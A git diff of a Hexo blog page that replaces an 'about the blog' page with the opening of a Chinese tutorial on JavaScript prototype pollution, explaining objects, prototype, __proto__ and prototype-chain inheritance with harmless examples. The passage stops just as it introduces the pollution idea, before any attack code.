@@ -1,849 +1,1771 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
+<!-- Head tag -->
 <head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="utf-8">
-  <title>Hexo</title>
-  <meta name="keywords" content>
-  <meta name="description" content="Hexo">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="JavaScript Prototype 污染攻击JS基本语法输出 window.alert();弹出警告框  console.log();将内容写到控制台   a = 5;  b = 6;  c = a + b;  console.log(c);  11 debugger eval code:1:9  undefined   语法JS使用对象(Object)定义一个对象 var person =">
-<meta name="keywords" content="javascript">
-<meta property="og:type" content="article">
-<meta property="og:title" content="JavaScript Prototype 污染攻击">
-<meta property="og:url" content="https://github.com/BrainLyh/2019/08/31/JavaScript原型污染/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="JavaScript Prototype 污染攻击JS基本语法输出 window.alert();弹出警告框  console.log();将内容写到控制台   a = 5;  b = 6;  c = a + b;  console.log(c);  11 debugger eval code:1:9  undefined   语法JS使用对象(Object)定义一个对象 var person =">
-<meta property="og:locale" content="default">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/258679/1560691466319-0c780440-b626-4d58-a3c0-315ccc5c3210.png#align=left&display=inline&height=444&name=image.png&originHeight=888&originWidth=1110&size=127913&status=done&width=555">
-<meta property="og:updated_time" content="2019-08-31T13:55:46.686Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="JavaScript Prototype 污染攻击">
-<meta name="twitter:description" content="JavaScript Prototype 污染攻击JS基本语法输出 window.alert();弹出警告框  console.log();将内容写到控制台   a = 5;  b = 6;  c = a + b;  console.log(c);  11 debugger eval code:1:9  undefined   语法JS使用对象(Object)定义一个对象 var person =">
-<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476">
 
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 
-<link rel="icon" href="/img/avatar.jpg">
+    <!--Description-->
+    
 
-<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+    <!--Author-->
+    
+        <meta name="author" content="Luc1fer">
+    
 
-<link href="/css/hl_theme/gruvbox-dark.css?v=1.0.1" rel="stylesheet">
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Hexo">
+    
 
-<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
-<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <!--Open Graph Description-->
+    
 
-<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
-<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Hexo">
 
-<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
-<script>
-    hljs.initHighlightingOnLoad();
-</script>
+    <!--Type page-->
+    
+        <meta property="og:type" content="website">
+    
 
-<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+    <!--Page Cover-->
+    
 
+    <meta name="twitter:card" content="summary">
+    
 
+    <!-- Title -->
+    
+    <title>Hexo</title>
 
-<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
 
-<script src="/js/iconfont.js?v=1.0.1"></script>
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
 
 </head>
-<div style="display: none">
-  <input class="theme_disqus_on" value="false">
-  <input class="theme_preload_comment" value="false">
-  <input class="theme_blog_path" value>
-</div>
+
 
 <body>
-<aside class="nav mobile">
-    <div class="nav-left">
-        <a href="/" class="avatar_target">
-    <img class="avatar" src="/img/avatar.jpg" />
-</a>
-<div class="author">
-    <span>Luc1fer</span>
-</div>
 
-<div class="icon">
-    
-        
-        <a title="rss" href="/atom.xml" target="_blank">
-            
-                <svg class="iconfont-svg" aria-hidden="true">
-                    <use xlink:href="#icon-rss"></use>
-                </svg>
-            
-        </a>
-        
-    
-        
-        <a title="github" href="https://github.com/BrainLyh" target="_blank">
-            
-                <svg class="iconfont-svg" aria-hidden="true">
-                    <use xlink:href="#icon-github"></use>
-                </svg>
-            
-        </a>
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-    
-        
-        <a title="email" href="mailto:brainsemail@163.com" target="_blank">
-            
-                <svg class="iconfont-svg" aria-hidden="true">
-                    <use xlink:href="#icon-email"></use>
-                </svg>
-            
-        </a>
-        
-    
-        
-        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=12128&site=qq&menu=yes" target="_blank">
-            
-                <svg class="iconfont-svg" aria-hidden="true">
-                    <use xlink:href="#icon-qq"></use>
-                </svg>
-            
-        </a>
-        
-    
-        
-    
-        
-        <a title="neteasemusic" href="https://music.163.com/#/user/home?id=125977062" target="_blank">
-            
-                <svg class="iconfont-svg" aria-hidden="true">
-                    <use xlink:href="#icon-neteasemusic"></use>
-                </svg>
-            
-        </a>
-        
-    
-</div>
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
 
-
-
-
-<ul>
-    <li><div class="all active">全部文章<small>(27)</small></div></li>
-    
-        
-            
-            <li><div data-rel="WP">WP<small>(5)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="ctf">ctf<small>(17)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="比赛回顾">比赛回顾<small>(1)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="渗透测试">渗透测试<small>(2)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="docker">docker<small>(1)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="wp">wp<small>(1)</small></div>
-                
-            </li>
-            
-        
-    
-</ul>
-<div class="left-bottom">
-    <div class="menus">
-    
-    
-    
-    
-    </div>
-    <div><a  class="friends">友链</a></div>
-</div>
-<input type="hidden" id="yelog_site_posts_number" value="27">
-
-<div style="display: none">
-    <span id="busuanzi_value_site_uv"></span>
-    <span id="busuanzi_value_site_pv"></span>
-</div>
-
-    </div>
-    <div class="nav-right">
-        <div class="friends-area">
-    <div class="friends-title">
-        友情链接
-        <i class="back-title-list"></i>
-    </div>
-    <div class="friends-content">
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
         <ul>
             
-            <li><a target="_blank" href="http://www.gtfly.top/">gtfly</a></li>
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
             
-            <li><a target="_blank" href="https://www.leavesongs.com/">P神</a></li>
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
             
         </ul>
     </div>
 </div>
-        <div class="title-list">
-    <form onkeydown="if(event.keyCode==13){return false;}">
-        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
-        <i class="cross"></i>
-        <span>
-            <label for="tagswitch">Tags:</label>
-            <input id="tagswitch" type="checkbox" style="display: none" />
-            <i id="tagsWitchIcon"></i>
-        </span>
-    </form>
-    <div class="tags-list">
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">WP</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color2">python</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">比赛回顾</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">LSB</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">MISC</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">隐写</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color1">javascript</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color1">mysql load data</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color3">工具</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">渗透测试</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color1">redis</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">ssrf</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">SQL</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">SSTI</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color2">Xdebuf</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">ctf</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">RSA</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color2">docker</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">serialize</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">php</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">弱类型</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">命令执行</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">zip</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color5">misc</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">xxe</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a href="javascript:" class="color4">哈希长度扩展攻击</a>
-    </li>
-    
-    <div class="clearfix"></div>
-</div>
 
-    
-    <nav id="title-list-nav">
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-        <a  class="WP "
-           href="/2018/03/23/CSAW CTF 2016 mfw Writeup/"
-           data-tag="WP"
-           data-author="" >
-            <span class="post-title" title="CSAW CTF 2016 mfw Writeup">CSAW CTF 2016 mfw Writeup</span>
-            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
-        </a>
+            <h1 id="main-title" class="title">Hexo</h1>
         
-        <a  class="WP "
-           href="/2017/03/23/HackLu Flatscience WP/"
-           data-tag="WP"
-           data-author="" >
-            <span class="post-title" title="HackLu FlatScience WP">HackLu FlatScience WP</span>
-            <span class="post-date" title="2017-03-23 15:13:47">2017/03/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/22/HostSplit/"
-           data-tag="python"
-           data-author="" >
-            <span class="post-title" title="HostSplit-Exploitable">HostSplit-Exploitable</span>
-            <span class="post-date" title="2019-08-22 11:39:23">2019/08/22</span>
-        </a>
-        
-        <a  class="比赛回顾 "
-           href="/2018/07/22/ISCC线下赛回顾/"
-           data-tag="比赛回顾"
-           data-author="" >
-            <span class="post-title" title="2019 ISCC线下赛回顾">2019 ISCC线下赛回顾</span>
-            <span class="post-date" title="2018-07-22 15:00:00">2018/07/22</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2018/03/23/LSB隐写/"
-           data-tag="LSB,MISC,隐写"
-           data-author="" >
-            <span class="post-title" title="LSB图片隐写">LSB图片隐写</span>
-            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/31/JavaScript原型污染/"
-           data-tag="javascript"
-           data-author="" >
-            <span class="post-title" title="JavaScript Prototype 污染攻击">JavaScript Prototype 污染攻击</span>
-            <span class="post-date" title="2019-08-31 21:55:35">2019/08/31</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/07/MySQL LOAD DATA/"
-           data-tag="mysql load data"
-           data-author="" >
-            <span class="post-title" title="MYSQL LOAD DATA">MYSQL LOAD DATA</span>
-            <span class="post-date" title="2019-08-07 22:14:02">2019/08/07</span>
-        </a>
-        
-        <a  class="渗透测试 "
-           href="/2018/02/23/Nessus使用指南/"
-           data-tag="工具,渗透测试"
-           data-author="" >
-            <span class="post-title" title="Nessus 使用指南">Nessus 使用指南</span>
-            <span class="post-date" title="2018-02-23 15:13:47">2018/02/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/16/SSRF/"
-           data-tag="redis,ssrf"
-           data-author="" >
-            <span class="post-title" title="redis与ssrf">redis与ssrf</span>
-            <span class="post-date" title="2019-08-16 16:11:22">2019/08/16</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/02/SQL入门/"
-           data-tag="SQL"
-           data-author="" >
-            <span class="post-title" title="SQL入门">SQL入门</span>
-            <span class="post-date" title="2019-08-02 09:43:50">2019/08/02</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/30/SSTI/"
-           data-tag="SSTI"
-           data-author="" >
-            <span class="post-title" title="SSTI-服务器端模板注入">SSTI-服务器端模板注入</span>
-            <span class="post-date" title="2019-08-30 15:28:13">2019/08/30</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/17/Xdebug/"
-           data-tag="Xdebuf,ctf"
-           data-author="" >
-            <span class="post-title" title="Xdebug">Xdebug</span>
-            <span class="post-date" title="2019-08-17 23:23:45">2019/08/17</span>
-        </a>
-        
-        <a  class="WP "
-           href="/2019/07/26/peaCTF-WP/"
-           data-tag="WP,RSA"
-           data-author="" >
-            <span class="post-title" title="peaCTF WP">peaCTF WP</span>
-            <span class="post-date" title="2019-07-26 15:13:47">2019/07/26</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/10/redis/"
-           data-tag="redis,ssrf"
-           data-author="" >
-            <span class="post-title" title="redis与ssrf">redis与ssrf</span>
-            <span class="post-date" title="2019-08-10 15:44:26">2019/08/10</span>
-        </a>
-        
-        <a  class="docker "
-           href="/2019/08/02/ubuntu配置docker/"
-           data-tag="docker"
-           data-author="" >
-            <span class="post-title" title="Ubuntu 16.04 配置docker">Ubuntu 16.04 配置docker</span>
-            <span class="post-date" title="2019-08-02 16:15:29">2019/08/02</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/03/23/序列化与反序列化/"
-           data-tag="serialize,php"
-           data-author="" >
-            <span class="post-title" title="序列化与反序列化">序列化与反序列化</span>
-            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
-        </a>
-        
-        <a  class="渗透测试 "
-           href="/2018/03/23/渗透测试-信息收集/"
-           data-tag="渗透测试"
-           data-author="" >
-            <span class="post-title" title="渗透测试-信息收集">渗透测试-信息收集</span>
-            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/19/Black_magic/"
-           data-tag="php,弱类型"
-           data-author="" >
-            <span class="post-title" title="black_magic">black_magic</span>
-            <span class="post-date" title="2019-08-19 18:59:50">2019/08/19</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/03/23/Command-Execution/"
-           data-tag="php,命令执行"
-           data-author="" >
-            <span class="post-title" title="命令执行漏洞(Command Execution)">命令执行漏洞(Command Execution)</span>
-            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
-        </a>
-        
-        <a  class="wp "
-           href="/2019/08/16/De1ctf/"
-           data-tag="ssrf,RSA"
-           data-author="" >
-            <span class="post-title" title="De1ctf">De1ctf</span>
-            <span class="post-date" title="2019-08-16 20:00:50">2019/08/16</span>
-        </a>
-        
-        <a  class="WP "
-           href="/2018/03/23/HITCON-Babytrick/"
-           data-tag="WP,SQL,serialize"
-           data-author="" >
-            <span class="post-title" title="HITCON-babytrick">HITCON-babytrick</span>
-            <span class="post-date" title="2018-03-23 15:13:47">2018/03/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2018/05/23/RSA/"
-           data-tag="RSA"
-           data-author="" >
-            <span class="post-title" title="RSA">RSA</span>
-            <span class="post-date" title="2018-05-23 15:13:47">2018/05/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/03/23/ZIP伪加密/"
-           data-tag="zip,misc"
-           data-author="" >
-            <span class="post-title" title="ZIP&#39;s things">ZIP&#39;s things</span>
-            <span class="post-date" title="2019-03-23 15:13:47">2019/03/23</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/01/session_unserialize/"
-           data-tag="serialize,php"
-           data-author="" >
-            <span class="post-title" title="Session_unserlize">Session_unserlize</span>
-            <span class="post-date" title="2019-08-01 19:33:07">2019/08/01</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/08/17/xxe/"
-           data-tag="xxe"
-           data-author="" >
-            <span class="post-title" title="xxe">xxe</span>
-            <span class="post-date" title="2019-08-17 15:23:51">2019/08/17</span>
-        </a>
-        
-        <a  class="WP "
-           href="/2019/08/01/JarvisOJ/"
-           data-tag="WP,SQL,serialize,哈希长度扩展攻击"
-           data-author="" >
-            <span class="post-title" title="JarvisOJ WP">JarvisOJ WP</span>
-            <span class="post-date" title="2019-08-01 19:37:28">2019/08/01</span>
-        </a>
-        
-        <a  class="ctf "
-           href="/2019/07/28/SQL/"
-           data-tag="SQL"
-           data-author="" >
-            <span class="post-title" title="SQL">SQL</span>
-            <span class="post-date" title="2019-07-28 15:13:47">2019/07/28</span>
-        </a>
-        
-    </nav>
-</div>
     </div>
-    <div class="hide-list">
-        <div class="semicircle">
-            <div class="brackets first"><</div>
-            <div class="brackets">&gt;</div>
+</header>
+
+        <section class="main">
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2019/08/31/JavaScript原型污染/">
+                JavaScript Prototype 污染攻击
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-08-31</span>
+            
+            
+                <a href="https://github.com/BrainLyh/2019/08/31/JavaScript原型污染/#disqus_thread" class="comments article-comment-link">Comments</a>
+            
+            
+                <span class="category">
+                    <a href="/categories/ctf/">ctf</a>
+                </span>
+            
         </div>
     </div>
-</aside>
-<div class="post index">
-    <div class="pjax">
-        <article class="index">
-            <div class="toc-ref">
+
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Why-Blog"><span class="toc-text">Why Blog</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对博客的理解"><span class="toc-text">对博客的理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#关于叶落阁"><span class="toc-text">关于叶落阁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#博客平台"><span class="toc-text">博客平台</span></a></li></ol></li></ol>
-    
-<style>
-    .left-col .switch-btn,
-    .left-col .switch-area {
-        display: none;
-    }
-    .toc-level-3 i,
-    .toc-level-3 ol {
-        display: none !important;
-    }
-</style>
-</div>
-            <h1 id="Why-Blog"><a href="#Why-Blog" class="headerlink" title="Why Blog"></a>Why Blog</h1><h2 id="对博客的理解"><a href="#对博客的理解" class="headerlink" title="对博客的理解"></a>对博客的理解</h2><p>喜欢写Blog的人，会经历三个阶段。</p>
-<blockquote>
-<p>第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。</p>
-</blockquote>
-<blockquote>
-<p>第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。</p>
-</blockquote>
-<blockquote>
-<p>第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。</p>
-</blockquote>
-<p>我们每个人的在网络上产生的数据越来越多，这些信息是我们在互联网上存在过的痕迹，值得我们认真对待。但是它们被分散分布在各个网站上。很多时候我们很难将它们聚合在一起，而且各个网站的信息排布方式也没有办法自由控制，所以我们需要一个可以由自己主宰的空间——博客。</p>
-<p>通过博客，我们可以记录自己的生活和成长的轨迹。它不像 Twitter 那样碎片化，也不像 Facebook 那样关系化，它是私人的空间。</p>
-<h2 id="关于叶落阁"><a href="#关于叶落阁" class="headerlink" title="关于叶落阁"></a>关于叶落阁</h2><p><strong>叶落阁</strong> 是阿杰（杨玉杰）的个人站。</p>
-<p>到目前为止已经写了<code class="article_number"></code>篇文章， 共<code class="site_word_count"></code>字。</p>
-<p>本站访问人数：<code class="site_uv"></code>人次 ， 访问量：<code class="site_pv"></code>次</p>
-<h2 id="博客平台"><a href="#博客平台" class="headerlink" title="博客平台"></a>博客平台</h2><p>这个博客通过 <a href="https://hexo.io/">Hexo</a> 生成，部署在 <a href="https://pages.github.com/">GitHub Pages</a>，主题 <a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a> 已经在github上开源</p>
-<p>主要功能：</p>
-<ul>
-<li>搜索支持文章标题、标签(#标签)、作者(@作者)</li>
-<li>pad/手机等移动端适配</li>
-<li>页面全局快捷键 <a href='http://yelog.org/2017/03/24/3-hexo-shortcuts/'>3-hexo快捷键说明</a></li>
+        <div class="content">
+            <h1 id="JavaScript-Prototype-污染攻击"><a href="#JavaScript-Prototype-污染攻击" class="headerlink" title="JavaScript Prototype 污染攻击"></a>JavaScript Prototype 污染攻击</h1><h2 id="JS基本语法"><a href="#JS基本语法" class="headerlink" title="JS基本语法"></a>JS基本语法</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul>
+<li><p>window.alert();弹出警告框</p>
+</li>
+<li><p>console.log();将内容写到控制台</p>
+<p>  a = 5;<br>  b = 6;<br>  c = a + b;<br>  console.log(c);<br>  11 debugger eval code:1:9<br>  undefined</p>
+</li>
 </ul>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p>JS使用对象(Object)定义一个对象</p>
+<pre><code>var person = {firstname:&quot;John&quot;,lastname:&quot;Doe&quot;};
 
-        </article>
-        
-        <p>
-            <a href="javascript:void(0)" class="dashang" onclick="dashangToggle()">赏</a>
-        </p>
-        
-        
-    </div>
-    <div class="copyright">
-        <p class="footer-entry">©2016-2019 Yelog</p>
-<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+person
+Object { firstname: &quot;John&quot;, lastname: &quot;Doe&quot; }</code></pre><p>JS语句可以写在函数内，函数可以重复引用：<strong>引用一个函数</strong> = 调用函数(执行函数内的语句)</p>
+<pre><code>function myFuncion(a,b) {
+  return a * b;
+}
 
-    </div>
-    <div class="full-toc">
-        <button class="full"><span class="min "></span></button>
-<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
-<div class="post-toc"><span class="post-toc-title">目录</span>
-    <div class="post-toc-content">
+myFuncion(2,3)
+6</code></pre><p>JS大小写敏感</p>
+<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>我们可以通过定义变量来创建对象</p>
+<pre><code>var car = {type:&quot;tzla&quot;,modle:500,color:&quot;white&quot;};</code></pre><p>这里，3个值<code>{&quot;tzle&quot;,500,&quot;white&quot;}</code>赋予变量car、3个变量<code>{type,modle,color}</code>赋予变量car.</p>
+<p>通常认为JS对象是键值对的容器。</p>
+<p>我们有两种方式访问对象属性</p>
+<pre><code>car.modle;
+car[&quot;modle&quot;];</code></pre><p>对象的方法定义了一个函数，并作为对象的属性存储</p>
+<pre><code>var person = {
+    firstName: &quot;John&quot;,
+    lastName : &quot;Doe&quot;,
+    id : 5566,
+    fullName : function() 
+    {
+       return this.firstName + &quot; &quot; + this.lastName;
+    }
+};</code></pre><p>对象方法通过添加()调用(作为一个函数)。</p>
+<pre><code>name = person.fullName();</code></pre><p>如果访问person对象的fullName属性，<code>name = person.fullName;</code> 他将作为一个字符串返回。</p>
+<h2 id="prototype-和-proto-分别是什么"><a href="#prototype-和-proto-分别是什么" class="headerlink" title="prototype 和 __proto__ 分别是什么"></a><code>prototype</code> 和 <code>__proto__</code> 分别是什么</h2><p>我们以构造函数的方式来定义一个类</p>
+<pre><code>function Foo() {
+    this.bar = 1
+}
 
-    </div>
+new Foo()</code></pre><p>Foo函数的内容就是Foo类的构造函数,而this.bar就是Foo类的一个属性。</p>
+<p>我们也可以将方法定义在构造函数内部：</p>
+<pre><code>function Foo() {
+    this.bar = 1
+    this.show = function() {
+    console.log(this.bar)
+    }
+}
+
+(new Foo()).show()</code></pre><p>但是这样的问题是每当我们新建一个Foo对象时，this.show = function…就会执行一次，这个show方法实际上是绑定在对象上的，而不是绑定在”类”中。</p>
+<p>我们使用原型(prototype)来实现在创建类的时候只创建一次show方法：</p>
+<pre><code>function Foo() {
+    this.bar = 1
+}
+
+Foo.prototype.show = function show() {
+  console.log(this.bar)
+}
+
+let foo = new Foo()
+
+foo.show()</code></pre><p>foo可以调用<code>show</code>方法来输出结果<code>1</code>。</p>
+<p>我们可以认为<code>prototype</code>是类<code>Foo</code>的一个属性，而所有Foo类实例化出来的对象都将拥有这个属性中的所有内容，包括变量和方法，就像foo具有<code>foo.show()</code>方法。</p>
+<p>我们可以通过prototype来访问Foo类的原型，但是Foo类实例化出来的对象是不能访问原型的，这里我们用到<code>__proto__</code>。</p>
+<p>一个Foo类实例化出来的对象是可以通过foo.<strong>proto</strong>属性来访问Foo类的原型：</p>
+<pre><code>foo.__proto__
+Object { show: show(), … }
+
+Foo.prototype
+Object { show: show(), … }
+
+Foo.prototype === foo.__proto__ 
+true</code></pre><p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560690468868-ed7f7f4f-6356-49eb-bb93-8f73aea44ae0.png#align=left&display=inline&height=209&name=image.png&originHeight=418&originWidth=952&size=54718&status=done&width=476" alt="二者的关系"></p>
+<p>于是我们知道：</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性指向这个对象所在类的<code>prototype</code>属性</li>
+</ol>
+<h2 id="JavaScript原型链继承"><a href="#JavaScript原型链继承" class="headerlink" title="JavaScript原型链继承"></a>JavaScript原型链继承</h2><p>所有类对象在实例化的时候将会拥有prototype中的属性和方法，这个特性被用来实现JavaScript中的继承</p>
+<pre><code>function Father() {
+    this.first_name = &#39;Donald&#39;
+    this.last_name = &#39;Trump&#39;
+}
+
+function Son() {
+    this.first_name = &#39;Melania&#39;
+}
+
+Son.prototype = new Father()
+
+let son = new Son()
+console.log(`Name: ${son.first_name} ${son.last_name}`)
+
+
+Name: Melania Trump</code></pre><p>在调用<code>son.last_name</code>的时候，JavaScript引擎做了这些事：</p>
+<ol>
+<li>在对象<code>son</code>中寻找<code>last_name</code></li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找<code>last_name</code></li>
+<li>如果仍然找不到，则在<code>son.__proto__.__proto__</code>中寻找<code>last_name</code></li>
+<li>一次寻找，直到找到<code>Null</code>结束。<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code>，因此<code>Object</code>是所有原型链的最顶层。</li>
+</ol>
+<p><img src="https://cdn.nlark.com/yuque/0/2019/png/258679/1560691466319-0c780440-b626-4d58-a3c0-315ccc5c3210.png#align=left&display=inline&height=444&name=image.png&originHeight=888&originWidth=1110&size=127913&status=done&width=555" alt></p>
+<p>于是我们知道：</p>
+<ol>
+<li>每个构造函数(constructor)都含有一个原型对象<code>prototype</code></li>
+<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
+<li><code>JavaScript</code>使用<code>prototype</code>链实现继承机制</li>
+</ol>
+<h2 id="什么是原型链污染"><a href="#什么是原型链污染" class="headerlink" title="什么是原型链污染"></a>什么是原型链污染</h2><p>由上文我们可以知道<code>foo.__proto__</code>指向的是<code>Foo</code>类的<code>prototype</code>.那么，如果我们修改了<code>foo.__proto__</code>中的值，就可以修改<code>Foo</code>类.</p>
